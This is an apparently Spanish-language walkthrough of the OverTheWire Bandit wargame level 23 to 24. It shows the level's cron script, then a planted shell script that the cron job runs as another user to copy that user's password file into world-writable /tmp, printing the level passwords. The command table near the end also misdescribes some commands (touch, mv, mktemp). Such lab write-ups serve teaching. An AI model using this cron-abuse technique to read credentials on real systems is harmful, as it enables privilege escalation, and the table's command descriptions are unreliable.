## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
ssh bandit23@bandit.labs.overthewire.org -p 2220
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:/$ mkdir /tmp/soje
bandit23@bandit:/$ cd /tmp/soje
bandit23@bandit:/tmp/soje$ echo "cat /etc/bandit_pass/bandit24 > /tmp/soje/password" > script.sh
bandit23@bandit:/tmp/soje$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/soje/password
bandit23@bandit:/tmp/soje$ chmod 777 script.sh
bandit23@bandit:/tmp/soje$ touch password
bandit23@bandit:/tmp/soje$ chmod 666 password
bandit23@bandit:/tmp/soje$ cp script.sh /var/spool/bandit24/foo

bandit23@bandit:/tmp/soje$ ls -la
total 10568
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 17:03 .
drwxrwx-wt 189 root     root     10801152 Sep 18 17:08 ..
-rw-rw-rw-   1 bandit23 bandit23       33 Sep 18 17:08 password
-rwxrwxrwx   1 bandit23 bandit23       51 Sep 18 17:03 script.sh
bandit23@bandit:/tmp/soje$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Nombre del script tiene que ser diferente
## Notas adicionales
|Comando|Descripción|
|---|---|
|mk temp|crea una carpeta con un nombre alaetorio|
|touch|crear carpeta|
|chmod|Cambiar permisos de archivos|
|mv|copiar un archivo|
## Referencias